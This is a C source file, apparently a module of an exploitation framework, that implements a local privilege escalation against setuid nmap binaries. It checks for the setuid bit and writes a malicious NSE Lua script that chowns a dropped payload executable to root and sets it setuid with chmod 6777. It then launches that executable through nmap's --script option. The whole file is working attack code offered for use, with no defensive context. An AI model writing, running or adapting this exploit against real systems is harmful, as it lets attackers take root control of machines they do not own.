#include <stdio.h>
#include <stdlib.h>
#include "../exploits.h"

struct exploitParam setuidNmapOpts[MAX_NUM_OF_PARAMS] = {
    { "Nmap", REQUIRED, STRING, NOT_SET, "/usr/bin/nmap", 13 },
    { "ExtraArgs", NOT_REQUIRED, STRING, NOT_SET, NULL, NOT_SET },
    { "WritableDir", REQUIRED, STRING, NOT_SET, "/tmp", 4 },
};

void setuidNmapHelp()
{
    printf("%s[ NO-CVE ]%s Setuid Nmap Exploit\n", txtblu, txtrst);
    printf("Affected software: Nmap with suid privileges\n");
    printf("References:\n");
    printf(" -\n");
}

static int check(struct Xploit *xp)
{
    int setuid;
    char a[128];
    char *nmapBinPath = xp->currentExploit->params[0].strValue;

    printf("nmap: %s;\n", nmapBinPath);
    snprintf(a, sizeof(a), "test -u %s", nmapBinPath);
    setuid = system(a);
	if(setuid != 0) {
		return -1;
	}

    return 0;
}

int setuidNmapFunc(struct Xploit *xp, unsigned char *rawPayload, unsigned int rawPayloadLen)
{
    FILE *f;
    char exeFile[256];
    char luaFile[256];
    char a[512];
    char *luaScript = 
        "os.execute(\"id\");\n"
        "os.execute(\"chown root:root %s\");\n"
        "os.execute(\"chmod 6777 %s\");\n"
        "os.execute(\"%s &\");\n";

    // exploit options
    struct exploit *e = xp->currentExploit;
    char *nmapBinPath = e->params[0].strValue;
    char *writableDir = e->params[2].strValue;
    char *extraArgs = e->params[1].strValue;
    /*
    unsigned char *rawPayload = xp->currentPayload->data;
    unsigned int rawPayloadLen = xp->currentPayload->dataLen;
    */

    // check if system is vulnerable
    if(check(xp) == -1) {
        // report as lib error
        printf("system not vulnerable\n");
        return -1;
    }

    // TODO: someRandFiles should have random name
    snprintf(exeFile, sizeof(exeFile), "%s/%s.elf", writableDir, "someRandFile");
    snprintf(luaFile, sizeof(luaFile), "%s/%s.nse", writableDir, "someRandScript");
    printf("exeFile: %s; luaFile: %s\n", exeFile, luaFile);

    // prepare malicious lua script
    if((f = fopen(luaFile, "w")) == NULL) {
        // report as lib error
        printf("Failed to create nse file\n");
        return -1;
    }
    if(fprintf(f, luaScript, exeFile, exeFile, exeFile, exeFile) == -1) {
        // report as lib error
		printf("Failed to write nse file\n");
		return -1;
    }
    fclose(f);

    // prepare exe file with payload
    create_x86_elf(exeFile, rawPayload, rawPayloadLen);

    // TODO: properly handle extraArgs (with system() it would be easier - snprintf)
    // execute nmap
    char *newargv[] = { nmapBinPath, "--script", luaFile, "-p80", "localhost", extraArgs, NULL };
    execve(nmapBinPath, newargv, NULL);

    // cleanup
    snprintf(a, sizeof(a), "rm -f %s %s", exeFile, luaFile);
    system(a);
    return 0;
}

struct exploit setuidNmap = {
    2,
    "setuid-nmap",
    setuidNmapFunc,
    setuidNmapOpts,
    3,
    setuidNmapHelp, 
    NULL
};
